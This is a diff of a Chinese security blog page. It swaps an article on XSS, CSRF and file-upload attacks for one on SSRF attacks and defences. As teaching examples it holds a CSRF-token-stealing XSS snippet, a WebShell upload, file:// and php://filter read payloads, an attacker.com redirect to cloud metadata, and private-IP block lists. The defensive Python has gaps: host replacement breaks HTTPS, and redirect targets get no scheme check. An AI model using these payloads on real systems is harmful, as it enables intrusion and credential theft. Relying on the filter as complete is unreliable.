-<p><strong>JSON 响应体</strong> 如果 Content-Type 设置错误（<code>text/html</code>），或者被嵌入到 HTML 页面的 <code>&lt;script&gt;</code> 标签中（<code>var data = &#123;&#123; user_data | safe &#125;&#125;</code>），也可能触发 XSS。</p>
-<p><strong>文件下载响应体</strong> 如果是用户上传的文件（图片、文档），可能包含恶意内容（图片马、SVG XSS）。</p>
+<p><strong>必须过滤的地址范围：</strong></p>
+<p><code>10.0.0.0/8</code>、<code>172.16.0.0/12</code>、<code>192.168.0.0/16</code>——RFC 1918 私有地址。</p>
+<p><code>127.0.0.0/8</code>——回环地址。<code>127.0.0.1</code> 是 localhost，但 <code>127.0.0.2</code>、<code>127.x.x.x</code> 也指向本机。</p>
+<p><code>169.254.0.0/16</code>——链路本地地址。云元数据服务 <code>169.254.169.254</code> 在这个范围。</p>
+<p><code>0.0.0.0</code>——在某些系统上解析为 localhost。</p>
+<p><code>::1</code>、<code>fc00::/7</code>——IPv6 的回环和私有地址。</p>
+<p><strong>八进制/十六进制 IP 绕过：</strong> 某些 URL 解析器接受非十进制格式的 IP。<code>0177.0.0.1</code>（八进制）= <code>127.0.0.1</code>，<code>0x7f000001</code>（十六进制）= <code>127.0.0.1</code>。防御代码必须先将 IP 标准化为数字格式再比对。</p>
+<h4 id="3-3-协议白名单：只允许-HTTP-HTTPS"><a href="#3-3-协议白名单：只允许-HTTP-HTTPS" class="headerlink" title="3.3 协议白名单：只允许 HTTP/HTTPS"></a>3.3 协议白名单：只允许 HTTP/HTTPS</h4><p>禁止 <code>file://</code>、<code>gopher://</code>、<code>dict://</code>、<code>ldap://</code>、<code>ftp://</code> 等协议，只允许 <code>http://</code> 和 <code>https://</code>：</p>
+<pre><code class="python">def safe_fetch(url):
+    parsed = urlparse(url)
+    if parsed.scheme not in (&#39;http&#39;, &#39;https&#39;):
+        raise ValueError(f&quot;Protocol &#123;parsed.scheme&#125; not allowed&quot;)
+    ...
+</code></pre>
+<p><strong>为什么这能防协议利用攻击？</strong> 因为 <code>file:///etc/passwd</code> 和 <code>gopher://192.168.1.100:6379/...</code> 都依赖非 HTTP 协议。只允许 HTTP/HTTPS 后，这些攻击路径全部被切断。</p>
+<p><strong>注意事项：</strong> 某些 URL 解析器对协议的判断和服务端 HTTP 客户端不一致。例如 <code>http://attacker.com\@192.168.1.1</code>，URL 解析器认为域名是 <code>attacker.com</code>，但某些 HTTP 客户端实际请求的是 <code>192.168.1.1</code>。应该使用成熟的 URL 解析库，并在解析后重新构造 URL。</p>
+<h4 id="3-4-请求方法限制和响应处理"><a href="#3-4-请求方法限制和响应处理" class="headerlink" title="3.4 请求方法限制和响应处理"></a>3.4 请求方法限制和响应处理</h4><p><strong>只允许 GET 请求：</strong> 很多 SSRF 利用需要 POST 或其他方法（如 gopher 协议向 Redis 发送命令）。限制为 GET 可以减少攻击面。</p>
+<pre><code class="python"># 只允许 GET
+response = requests.get(url, timeout=5, allow_redirects=False)
+</code></pre>
+<p><strong>禁止跟随重定向：</strong> 服务端可能先校验 URL 合法，然后发起请求。如果 HTTP 客户端自动跟随重定向，攻击者可以先指向合法地址，然后 302 重定向到内网地址：</p>
+<pre><code>https://app.com/api/avatar?url=https://attacker.com/redirect
+  → 校验 URL：https://attacker.com/redirect → 合法（外部域名）
+  → 发起请求 → attacker.com 返回 302 Location: http://169.254.169.254/
+  → HTTP 客户端自动跟随重定向 → 请求到达云元数据服务
+</code></pre>
+<pre><code class="python"># 禁止自动跟随重定向
+response = requests.get(url, allow_redirects=False)
+# 如果需要跟随重定向，必须对每个重定向目标重新校验
+</code></pre>
+<p><strong>限制响应大小和超时：</strong> 防止 SSRF 被用于 DoS（让服务端下载超大文件或等待长时间无响应）。</p>
+<pre><code class="python">response = requests.get(url, timeout=5, stream=True)
+# 限制响应大小
+content = response.raw.read(1024 * 1024)  # 最多读 1MB
+</code></pre>
+<h4 id="3-5-统一防御方案"><a href="#3-5-统一防御方案" class="headerlink" title="3.5 统一防御方案"></a>3.5 统一防御方案</h4><p>将以上策略组合，形成一个完整的防御函数：</p>
+<pre><code class="python">import ipaddress
+import socket
+from urllib.parse import urlparse
+
+ALLOWED_SCHEMES = (&#39;http&#39;, &#39;https&#39;)
+BLOCKED_NETWORKS = [
+    ipaddress.ip_network(&#39;10.0.0.0/8&#39;),
+    ipaddress.ip_network(&#39;172.16.0.0/12&#39;),
+    ipaddress.ip_network(&#39;192.168.0.0/16&#39;),
+    ipaddress.ip_network(&#39;127.0.0.0/8&#39;),
+    ipaddress.ip_network(&#39;169.254.0.0/16&#39;),
+    ipaddress.ip_network(&#39;0.0.0.0/8&#39;),
+    ipaddress.ip_network(&#39;::1/128&#39;),
+    ipaddress.ip_network(&#39;fc00::/7&#39;),
+]
+
+def safe_fetch(url, max_size=1024*1024):
+    # 1. 协议白名单
+    parsed = urlparse(url)
+    if parsed.scheme not in ALLOWED_SCHEMES:
+        raise ValueError(f&quot;Protocol &#123;parsed.scheme&#125; not allowed&quot;)
+
+    # 2. DNS 解析
+    try:
+        ip = socket.gethostbyname(parsed.hostname)
+    except socket.gaierror:
+        raise ValueError(&quot;Cannot resolve hostname&quot;)
+
+    # 3. 内网 IP 过滤
+    ip_obj = ipaddress.ip_address(ip)
+    if any(ip_obj in net for net in BLOCKED_NETWORKS):
+        raise ValueError(&quot;Internal IP not allowed&quot;)
+
+    # 4. 用解析后的 IP 发起请求（防 DNS 重绑定）
+    safe_url = url.replace(parsed.hostname, ip)
+    response = requests.get(
+        safe_url,
+        timeout=5,
+        allow_redirects=False,  # 禁止自动重定向
+        stream=True
+    )
+
+    # 5. 限制响应大小
+    content = response.raw.read(max_size)
+    return content
+</code></pre>
+<p>如果业务需要跟随重定向，每次重定向都要重新校验目标 IP：</p>
+<pre><code class="python">def safe_fetch_with_redirects(url, max_redirects=3):
+    for _ in range(max_redirects):
+        # 每次迭代都重新执行完整的校验流程
+        parsed = urlparse(url)
+        ip = socket.gethostbyname(parsed.hostname)
+        if any(ipaddress.ip_address(ip) in net for net in BLOCKED_NETWORKS):
+            raise ValueError(&quot;Redirect to internal IP blocked&quot;)
+
+        response = requests.get(url, timeout=5, allow_redirects=False, stream=True)
+        if response.status_code in (301, 302, 303, 307, 308):
+            url = response.headers.get(&#39;Location&#39;)
+            if not url:
+                break
+            continue
+        # 非重定向响应，返回内容
+        return response.raw.read(1024*1024)
+    raise ValueError(&quot;Too many redirects&quot;)
+</code></pre>
 <hr>
-<h3 id="三、三种攻击在请求响应链路中的映射"><a href="#三、三种攻击在请求响应链路中的映射" class="headerlink" title="三、三种攻击在请求响应链路中的映射"></a>三、三种攻击在请求响应链路中的映射</h3><p>现在把 XSS、CSRF、文件上传三种攻击映射到这条链路上，看它们各自攻击的是哪个环节。</p>
-<h4 id="3-1-XSS：攻击响应体中的-HTML-渲染"><a href="#3-1-XSS：攻击响应体中的-HTML-渲染" class="headerlink" title="3.1 XSS：攻击响应体中的 HTML 渲染"></a>3.1 XSS：攻击响应体中的 HTML 渲染</h4><p>XSS 的核心环节是<strong>响应体</strong>。攻击者将恶意数据注入到服务端的响应中，浏览器解析响应体时执行恶意脚本。</p>
-<pre><code>请求阶段                          响应阶段
-┌─────────────────────┐          ┌─────────────────────────────────┐
-│ GET /search?q=&lt;script&gt;│ ──→    │ HTML: &lt;p&gt;搜索结果：&lt;script&gt;...&lt;/p&gt;│
-│                      │         │                                  │
-│ 注入点在请求的查询参数 │         │ 恶意数据被拼入响应体的 HTML 中    │
-└─────────────────────┘          │                                  │
-                                 │ 浏览器解析响应体 → 执行 &lt;script&gt;  │
-                                 └─────────────────────────────────┘
+<h3 id="四、SSRF-与-CSRF-的对比"><a href="#四、SSRF-与-CSRF-的对比" class="headerlink" title="四、SSRF 与 CSRF 的对比"></a>四、SSRF 与 CSRF 的对比</h3><p>SSRF 和 CSRF 名字相似，攻击方向完全不同。对比理解有助于记忆：</p>
+<pre><code>              CSRF                          SSRF
+攻击对象     用户（借用户的浏览器发请求）     服务端（借服务端的网络发请求）
+攻击发生位置  客户端（浏览器）                服务端（后端应用）
+利用的能力    浏览器自动携带 Cookie           服务端可以访问内网
+攻击目标      以用户身份执行操作              访问内网服务/云元数据/本地文件
+防御核心      SameSite Cookie / CSRF Token   URL 白名单 / 内网 IP 过滤
 </code></pre>
-<p><strong>攻击的完整链路：</strong></p>
-<p>请求阶段：攻击者构造恶意 URL，将 payload 放在查询参数中（<code>?q=&lt;script&gt;...</code>）。</p>
-<p>服务端处理：服务端从查询参数中取出值，未经转义拼入 HTML 模板。</p>
-<p>响应阶段：响应体中包含未转义的 <code>&lt;script&gt;</code> 标签。</p>
-<p>浏览器渲染：浏览器解析 HTML，遇到 <code>&lt;script&gt;</code> 执行其中的 JS。</p>
-<p><strong>XSS 的关键防御点在响应阶段：</strong> 输出编码（在响应体中将 <code>&lt;</code> 转为 <code>&amp;lt;</code>）和 CSP 响应头（告诉浏览器不要执行内联脚本）。</p>
-<p><strong>三种 XSS 在链路上的差异：</strong></p>
-<p>反射型：恶意数据在请求参数中 → 服务端回显到响应体 → 浏览器执行。数据经过服务端。</p>
-<p>存储型：恶意数据先通过一个 POST 请求写入数据库 → 后续 GET 请求时服务端从数据库取出 → 拼入响应体 → 浏览器执行。数据经过服务端两次（写入和读出）。</p>
-<p>DOM 型：恶意数据在 URL hash 中 → 前端 JS 从 <code>location.hash</code> 读取 → 写入 <code>innerHTML</code> → 浏览器执行。数据不经过服务端，完全在客户端流转。</p>
-<h4 id="3-2-CSRF：攻击请求阶段中的-Cookie-自动携带"><a href="#3-2-CSRF：攻击请求阶段中的-Cookie-自动携带" class="headerlink" title="3.2 CSRF：攻击请求阶段中的 Cookie 自动携带"></a>3.2 CSRF：攻击请求阶段中的 Cookie 自动携带</h4><p>CSRF 的核心环节是<strong>请求阶段</strong>。攻击者利用浏览器自动携带 Cookie 的行为，以用户身份发出伪造请求。</p>
-<pre><code>请求阶段                              响应阶段
-┌──────────────────────────┐         ┌──────────────────┐
-│ attacker.com 页面中的表单  │ ──→     │ bank.com 处理转账  │
-│ &lt;form action=bank.com&gt;    │         │ Cookie 有效，执行  │
-│                           │         │                  │
-│ 浏览器自动携带 bank.com    │         │ 服务端无法区分     │
-│ 的 Cookie 发出跨站请求     │         │ 请求是主动还是伪造 │
-└──────────────────────────┘         └──────────────────┘
-</code></pre>
-<p><strong>攻击的完整链路：</strong></p>
-<p>请求阶段（攻击者侧）：攻击者在自己的页面上放置 <code>&lt;form&gt;</code> 或 <code>&lt;img&gt;</code>，指向目标站的操作接口。</p>
-<p>请求阶段（浏览器侧）：用户访问攻击页面，浏览器加载 <code>&lt;form&gt;</code> 或 <code>&lt;img&gt;</code>，自动携带目标站的 Cookie 发出请求。</p>
-<p>服务端处理：服务端收到请求，看到有效的 Cookie，认为是用户本人操作，执行请求中的操作。</p>
-<p>响应阶段：服务端返回操作结果（攻击者不关心响应内容）。</p>
-<p><strong>CSRF 的关键防御点在请求阶段：</strong> SameSite Cookie（阻止跨站携带 Cookie）、CSRF Token（在请求中携带服务端校验的令牌）、自定义请求头（利用表单无法设置自定义头的限制）。</p>
-<p><strong>CSRF 不关心响应阶段。</strong> 攻击者不需要读取服务端的响应，只需要请求发出去、操作被执行就够了。这与 XSS 形成鲜明对比——XSS 需要在响应体中注入内容，CSRF 只关心请求是否被发出。</p>
-<h4 id="3-3-文件上传：攻击请求体中的-multipart-解析"><a href="#3-3-文件上传：攻击请求体中的-multipart-解析" class="headerlink" title="3.3 文件上传：攻击请求体中的 multipart 解析"></a>3.3 文件上传：攻击请求体中的 multipart 解析</h4><p>文件上传的核心环节是<strong>请求体</strong>。攻击者通过 <code>multipart/form-data</code> 格式将恶意文件发送到服务端，服务端解析请求体、提取文件、存储到文件系统。</p>
-<pre><code>请求阶段                                响应阶段
-┌────────────────────────────┐        ┌────────────────────────┐
-│ POST /upload               │ ──→    │ 文件被写入服务器文件系统 │
-│ Content-Type: multipart/   │        │                        │
-│   form-data; boundary=xxx  │        │ 如果上传目录可执行脚本   │
-│                            │        │ → 攻击者访问文件 → RCE  │
-│ filename: shell.php        │        │ 如果配合 LFI           │
-│ Content-Type: image/jpeg   │        │ → 通过 include() 执行   │
-│ 内容: &lt;?php phpinfo(); ?&gt;  │        │ 如果文件名有路径穿越     │
-│                            │        │ → 文件写到任意位置       │
-│ 请求体中携带恶意文件内容    │        └────────────────────────┘
-│ 和伪造的文件名/MIME类型    │
-└────────────────────────────┘
-</code></pre>
-<p><strong>攻击的完整链路：</strong></p>
-<p>请求阶段：攻击者构造 <code>multipart/form-data</code> 请求，在 <code>filename</code> 中注入路径穿越序列，在文件内容中放入 WebShell，在 <code>Content-Type</code> 中伪造合法 MIME。</p>
-<p>服务端处理：解析 multipart 结构，校验文件名和类型（可能被绕过），将文件写入文件系统。</p>
-<p>后续请求：攻击者访问上传的文件 URL，如果上传目录可执行脚本，WebShell 被执行。</p>
-<p><strong>文件上传的关键防御点横跨请求和服务端两个阶段：</strong> 请求阶段校验文件名和类型（白名单、Magic Number），服务端阶段限制上传目录的执行权限、使用随机文件名、隔离存储域名。</p>
+<p>CSRF 中，攻击者需要诱导用户点击链接（用户是跳板）。SSRF 中，攻击者直接与服务端交互，不需要用户参与（服务端是跳板）。</p>
+<p>CSRF 的防御是确保”请求确实是用户主动发出的”（Token、SameSite）。SSRF 的防御是确保”服务端请求的地址是安全的”（白名单、IP 过滤）。</p>
+<p>两者的共同根源是：系统在处理外部输入时，没有校验请求的目标地址是否合法。CSRF 没有校验请求是否来自合法页面，SSRF 没有校验 URL 是否指向合法地址。</p>
 <hr>
-<h3 id="四、三种攻击的关联与对比"><a href="#四、三种攻击的关联与对比" class="headerlink" title="四、三种攻击的关联与对比"></a>四、三种攻击的关联与对比</h3><h4 id="4-1-攻击位置对比"><a href="#4-1-攻击位置对比" class="headerlink" title="4.1 攻击位置对比"></a>4.1 攻击位置对比</h4><pre><code>                    请求阶段                          响应阶段
-            ┌──────────────────────┐          ┌──────────────────────┐
-            │ 请求行 │ 请求头 │ 请求体 │          │ 响应头 │ 响应体 │
-            └──────────────────────┘          └──────────────────────┘
-XSS         注入点    ─       ─                CSP     ★ 主战场
-            (URL参数)                          (兜底)   (HTML渲染)
-
-CSRF        ─        ★ 主战场  ─                ─       ─
-                     (Cookie                   (不关心
-                      自动携带)                  响应内容)
-
-文件上传    ─        ─       ★ 主战场           安全响应头  后续访问
-                            (multipart          (Content-  (执行恶意
-                             文件内容)            Disposition) 文件)
+<h3 id="五、各语言-框架的-SSRF-风险点"><a href="#五、各语言-框架的-SSRF-风险点" class="headerlink" title="五、各语言/框架的 SSRF 风险点"></a>五、各语言/框架的 SSRF 风险点</h3><h4 id="5-1-Java"><a href="#5-1-Java" class="headerlink" title="5.1 Java"></a>5.1 Java</h4><p><code>java.net.URL</code> 和 <code>HttpURLConnection</code> 默认支持多种协议（<code>http</code>、<code>https</code>、<code>file</code>、<code>jar</code>、<code>ftp</code>）。如果直接用用户输入的 URL 构造 <code>URL</code> 对象并打开连接，<code>file:///etc/passwd</code> 会被读取。</p>
+<pre><code class="java">// 危险：直接接受用户输入的 URL
+URL url = new URL(userInput);
+URLConnection conn = url.openConnection();
+InputStream is = conn.getInputStream();
 </code></pre>
-<p>XSS 的主战场在响应体——恶意数据被渲染为可执行代码。CSRF 的主战场在请求头中的 Cookie——浏览器自动携带凭证。文件上传的主战场在请求体中的 multipart 数据——恶意文件被写入服务端。</p>
-<h4 id="4-2-攻击者需要什么"><a href="#4-2-攻击者需要什么" class="headerlink" title="4.2 攻击者需要什么"></a>4.2 攻击者需要什么</h4><p><strong>XSS 攻击者需要：</strong> 找到一个用户输入被回显到 HTML 中且未编码的位置。攻击者需要理解服务端的 HTML 渲染逻辑，找到注入点。</p>
-<p><strong>CSRF 攻击者需要：</strong> 用户已登录目标站 + 目标站缺乏 CSRF 防御。攻击者不需要理解目标站的内部逻辑，只需要知道操作接口的 URL 和参数格式（通过抓包分析）。</p>
-<p><strong>文件上传攻击者需要：</strong> 一个文件上传接口 + 上传目录可执行脚本（或配合 LFI）。攻击者需要理解服务端的文件处理逻辑（校验了什么、没校验什么）。</p>
-<h4 id="4-3-三者之间的连锁关系"><a href="#4-3-三者之间的连锁关系" class="headerlink" title="4.3 三者之间的连锁关系"></a>4.3 三者之间的连锁关系</h4><p>三种攻击不是孤立的，它们经常组合使用：</p>
-<p><strong>XSS 绕过 CSRF 防御：</strong> 如果目标站有 CSRF Token 但存在 XSS，攻击者可以通过 XSS 读取页面中的 CSRF Token，然后以用户身份发起带有效 Token 的请求。此时 CSRF Token 形同虚设——因为攻击者通过 XSS 获得了和目标站 JS 相同的权限。</p>
-<pre><code class="javascript">// XSS 注入的 JS：读取 CSRF Token，发起伪造请求
-const token = document.querySelector(&#39;input[name=csrf_token]&#39;).value;
-fetch(&#39;/api/transfer&#39;, &#123;
-  method: &#39;POST&#39;,
-  headers: &#123; &#39;X-CSRF-Token&#39;: token &#125;,
-  credentials: &#39;include&#39;,
-  body: JSON.stringify(&#123; to: &#39;attacker&#39;, amount: 10000 &#125;)
-&#125;);
+<p>Spring 的 <code>RestTemplate</code> 和 <code>WebClient</code> 默认跟随重定向，需要在配置中禁用。</p>
+<h4 id="5-2-Python"><a href="#5-2-Python" class="headerlink" title="5.2 Python"></a>5.2 Python</h4><p><code>requests.get(url)</code> 默认跟随重定向（最多 30 次），默认支持 <code>http</code> 和 <code>https</code>，但不支持 <code>file://</code>。但如果使用 <code>urllib</code>，<code>file://</code> 协议是可用的。</p>
+<pre><code class="python"># 危险：urllib 支持 file://
+import urllib.request
+content = urllib.request.urlopen(user_input).read()
+# user_input = &quot;file:///etc/passwd&quot; → 读取本地文件
 </code></pre>
-<p><strong>文件上传 → XSS：</strong> 上传 SVG 文件（内含 JavaScript），如果上传目录没有做域名隔离或 Content-Disposition 限制，其他用户访问该 SVG 时触发 XSS。这是文件上传和 XSS 的交叉点。</p>
-<p><strong>文件上传 → CSRF：</strong> 上传 <code>.htaccess</code> 文件修改服务器解析规则，让 <code>.jpg</code> 被当作 PHP 执行。这本身不是 CSRF，但上传操作如果缺乏 CSRF 防护，攻击者可以以管理员身份通过 CSRF 在管理后台上传恶意文件。</p>
-<p><strong>XSS + CSRF 组合：</strong> XSS 注入的 JS 可以发起跨域请求（因为同源策略不阻止发送请求，只阻止读取响应）。如果配合 CORS 配置错误，XSS 可以读取其他域的敏感数据，将 XSS 的影响从一个域扩展到多个域。</p>
-<h4 id="4-4-防御侧重对比"><a href="#4-4-防御侧重对比" class="headerlink" title="4.4 防御侧重对比"></a>4.4 防御侧重对比</h4><pre><code>            XSS                    CSRF                   文件上传
-            ─────────────────     ─────────────────      ─────────────────
-核心风险    数据被当作代码执行      请求被以用户身份发出     恶意文件被写入可执行环境
-
-主战场     响应体（HTML渲染）      请求头（Cookie携带）     请求体（multipart解析）
-
-最关键防御  输出编码                SameSite Cookie         上传目录禁执行
-           （按上下文选编码函数）   （阻断跨站携带Cookie）   （最后一道防线）
-
-兜底防御   CSP响应头               CSRF Token              独立域名/对象存储
-           （禁止内联脚本）        （服务端校验请求合法性）  （隔离执行环境）
-
-辅助防御   输入验证                自定义请求头              文件名随机化
-           模板引擎默认转义         Origin校验               Magic Number校验
-           框架默认转义             二次验证                 防病毒扫描
+<p><code>curl</code> 命令行工具（如果通过 <code>subprocess</code> 调用）默认支持大量协议，包括 <code>dict://</code>、<code>gopher://</code>、<code>ftp://</code>。</p>
+<h4 id="5-3-PHP"><a href="#5-3-PHP" class="headerlink" title="5.3 PHP"></a>5.3 PHP</h4><p><code>file_get_contents()</code> 默认支持多种协议包装器（<code>file://</code>、<code>http://</code>、<code>ftp://</code>、<code>php://</code>、<code>data://</code>、<code>glob://</code>）。</p>
+<pre><code class="php">// 危险：file_get_contents 支持多种协议
+$content = file_get_contents($userInput);
+// $userInput = &quot;file:///etc/passwd&quot; → 读取本地文件
+// $userInput = &quot;php://filter/convert.base64-encode/resource=config.php&quot; → 读取 PHP 源码
 </code></pre>
-<p>三种攻击的防御逻辑有一个共同点：<strong>纵深防御，不依赖任何单一手段。</strong></p>
-<p>XSS 的纵深：输出编码 → 模板引擎默认转义 → CSP → 输入验证。</p>
-<p>CSRF 的纵深：SameSite Cookie → CSRF Token → CORS → 自定义头 → 二次验证。</p>
-<p>文件上传的纵深：上传目录禁执行 → 文件名随机化 → 扩展名白名单 → Magic Number → 独立域名隔离 → 防病毒扫描。</p>
-<p>每一层都可能被绕过，但组合使用可以大幅提高攻击成本。</p>
-<h4 id="4-5-一个统一的视角"><a href="#4-5-一个统一的视角" class="headerlink" title="4.5 一个统一的视角"></a>4.5 一个统一的视角</h4><p>从 HTTP 协议的角度看，三种攻击的本质可以统一为：</p>
-<p><strong>XSS = 响应体中的数据被浏览器当作代码执行。</strong> 防御核心是确保数据始终是数据——输出编码、CSP。</p>
-<p><strong>CSRF = 请求中的身份凭证被浏览器自动携带。</strong> 防御核心是确保请求确实是用户主动发出的——SameSite、Token。</p>
-<p><strong>文件上传 = 请求体中的恶意内容被服务端写入可执行环境。</strong> 防御核心是确保写入的内容不可执行——目录权限、存储隔离。</p>
-<p>三者的共同根源是：<strong>系统在处理用户可控数据时，没有正确区分”数据”和”指令”的边界。</strong> XSS 混淆了 HTML 数据和 JS 代码，CSRF 混淆了用户请求和伪造请求，文件上传混淆了普通文件和可执行脚本。</p>
-<p>理解了这一点，再看任何新的 Web 漏洞，都可以问同一个问题：<strong>在这个漏洞中，数据和指令的边界在哪里被混淆了？</strong></p>
+<p><code>curl_exec()</code> 默认跟随重定向，且支持 <code>dict://</code>、<code>gopher://</code> 等协议（取决于编译选项）。</p>
+<h4 id="5-4-Node-js"><a href="#5-4-Node-js" class="headerlink" title="5.4 Node.js"></a>5.4 Node.js</h4><p>Node.js 原生 <code>http</code> 模块只支持 HTTP 协议，但第三方库如 <code>node-fetch</code>、<code>axios</code> 默认跟随重定向。<code>got</code> 库支持多种协议。</p>
+<pre><code class="javascript">// 危险：axios 默认跟随重定向
+const axios = require(&#39;axios&#39;);
+const response = await axios.get(userInput);
+// userInput 指向攻击者服务器 → 302 重定向到 http://169.254.169.254/
+</code></pre>
+<hr>
+<h3 id="六、防御优先级总结"><a href="#六、防御优先级总结" class="headerlink" title="六、防御优先级总结"></a>六、防御优先级总结</h3><p>按重要程度排列：</p>
+<ol>
+<li><strong>URL 白名单</strong>——只允许请求预定义的安全域名，默认拒绝一切</li>
+<li><strong>内网 IP 过滤</strong>——DNS 解析后校验 IP，禁止请求私有地址和云元数据地址</li>
+<li><strong>协议白名单</strong>——只允许 <code>http://</code> 和 <code>https://</code>，禁止 <code>file://</code>、<code>gopher://</code> 等</li>
+<li><strong>禁止自动重定向</strong>——或每次重定向重新校验目标 IP</li>
+<li><strong>防 DNS 重绑定</strong>——校验后用已解析的 IP 直接发起请求</li>
+<li><strong>限制响应大小和超时</strong>——防止 DoS</li>
+<li><strong>最小权限原则</strong>——服务端应用使用最低权限运行，减少被利用后的影响范围</li>
+</ol>
+<hr>
+<h3 id="七、小结"><a href="#七、小结" class="headerlink" title="七、小结"></a>七、小结</h3><p>SSRF 的本质是攻击者借服务端的网络能力访问其本不该访问的地址。与 CSRF 形成对称——CSRF 借用户的浏览器发请求，SSRF 借服务端的网络发请求。</p>
+<p>按攻击效果分四种：基础 SSRF 探测和访问内网服务，云元数据攻击窃取 IAM 凭证（云环境中最致命），协议利用通过 gopher/dict/file 精确攻击内网非 HTTP 服务，盲 SSRF 无回显但可通过副作用触发内部操作。</p>
+<p>防御的核心是纵深防御。URL 白名单是最安全的策略，内网 IP 过滤是白名单不可用时的底线，协议白名单切断非 HTTP 协议的利用路径，禁止自动重定向和防 DNS 重绑定堵住校验后的绕过路径。组合使用才能有效防御。</p>
 
                 
             </div>
@@ -724,7 +854,7 @@ fetch(&#39;/api/transfer&#39;, &#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2026/08/07/2026-08-07-http-request-response-security-landscape/">http://example.com/2026/08/07/2026-08-07-http-request-response-security-landscape/</a>
+                    <a href="http://example.com/2026/08/08/2026-08-08-ssrf-attacks-principles-and-defense/">http://example.com/2026/08/08/2026-08-08-ssrf-attacks-principles-and-defense/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -770,8 +900,8 @@ fetch(&#39;/api/transfer&#39;, &#123;
                                     <span class="chip bg-color">Web安全</span>
                                 </a>
                             
-                                <a href="/tags/HTTP/">
-                                    <span class="chip bg-color">HTTP</span>
+                                <a href="/tags/SSRF/">
+                                    <span class="chip bg-color">SSRF</span>
                                 </a>
                             
                         </div>
@@ -943,9 +1073,10 @@ fetch(&#39;/api/transfer&#39;, &#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2026/08/08/2026-08-08-ssrf-attacks-principles-and-defense/">
                     <div class="card-image">
@@ -963,9 +1094,9 @@ fetch(&#39;/api/transfer&#39;, &#123;
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-08-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -974,6 +1105,7 @@ fetch(&#39;/api/transfer&#39;, &#123;
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1000,13 +1132,13 @@ fetch(&#39;/api/transfer&#39;, &#123;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/08/07/2026-08-07-csrf-attacks-principles-and-defense/">
+                <a href="/2026/08/07/2026-08-07-http-request-response-security-landscape/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="CSRF 跨站请求伪造：原理、攻击与防御">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="HTTP 请求响应全景：从协议结构看 Web 攻击的本质">
                         
-                        <span class="card-title">CSRF 跨站请求伪造：原理、攻击与防御</span>
+                        <span class="card-title">HTTP 请求响应全景：从协议结构看 Web 攻击的本质</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1038,8 +1170,8 @@ fetch(&#39;/api/transfer&#39;, &#123;
                         <span class="chip bg-color">Web安全</span>
                     </a>
                     
-                    <a href="/tags/CSRF/">
-                        <span class="chip bg-color">CSRF</span>
+                    <a href="/tags/HTTP/">
+                        <span class="chip bg-color">HTTP</span>
                     </a>
                     
                 </div>
